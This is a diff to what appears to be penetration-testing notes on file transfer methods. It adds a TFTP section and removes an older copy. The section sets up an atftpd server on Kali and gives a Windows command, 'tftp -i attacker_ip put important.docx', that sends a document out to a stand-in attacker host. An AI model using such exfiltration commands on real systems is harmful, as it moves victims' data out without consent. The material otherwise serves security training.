@@ -19,9 +19,52 @@ As a general rule of thumb, we should always try to use native tools on the comp
   
   
 [Non-Interactive Shell Upgrading](Non-Interactive%20TTY.md)
-  
+
+
+### Pure-FTP
+
 [Setting up pure-ftpd on Linux](pure-ftpd.md)
 
+### TFTP
+
+[TFTP](tftp.md) is a UDP-based file transfer protocol and is often restricted by corporate egress firewall rules.  
+Useful for systems prior to PS's default install: (Windows 7 and Windows Server 2008 R2) , IoT, and other small form-factor devices
+  
+Setup:  
+	On Kali:  
+1. Install and configure a TFTP server in Kali and create a directory to store and serve files.  
+```bash
+sudo apt update && sudo apt install atftp
+```
+
+
+2. Next, we update the ownership of the directory so we can write files to it.  
+```bash
+sudo mkdir /tftp  
+sudo chown nobody: /tftp
+```
+
+3. We will run atftpd as a daemon on UDP port 69 and direct it to use the newly created **/tftp** directory  
+```bash
+sudo atftpd --daemon --port 69 /tftp
+```
+
+On Windows:  
+1. Run the **tftp** client  
+```powershell
+tftp -i attacker_ip put important.docx
+```
+.
+- **-i** - Specify binary image transer  
+- **put** - Initiates an upload
+
+### Apache 2
+
+```bash
+sudo systemctl start apache2
+```
+
+web root is located /var/www/html/
 
 
 ### Windows-based file transfers:
@@ -295,35 +338,3 @@ C:\Users\Offsec> powershell.exe Invoke-RestMethod -Uri http://attakcer_ip/upload
 
 
 
-### Exfill via TFTP
-
-[TFTP](tftp.md) is a UDP-based file transfer protocol and is oftenrestricted by corporate egress firewall rules.  
-Useful for systems prior to PS's default install: (Windows 7 and Windows Server 2008 R2)  
-  
-Setup:  
-	On Kali:  
-1. Install and configure a TFTP server in Kali and create a directory to store and serve files.  
-```bash
-sudo apt update && sudo apt install atftp
-```
-
-
-2. Next, we update the ownership of the directory so we can write files to it.  
-```bash
-sudo mkdir /tftp  
-sudo chown nobody: /tftp
-```
-
-3. We will run atftpd as a daemon on UDP port 69 and direct it to use the newly created **/tftp** directory  
-```bash
-sudo atftpd --daemon --port 69 /tftp
-```
-
-On Windows:  
-1. Run the **tftp** client  
-```powershell
-tftp -i attacker_ip put important.docx
-```
-.
-- **-i** - Specify binary image transer  
-- **put** - Initiates an upload
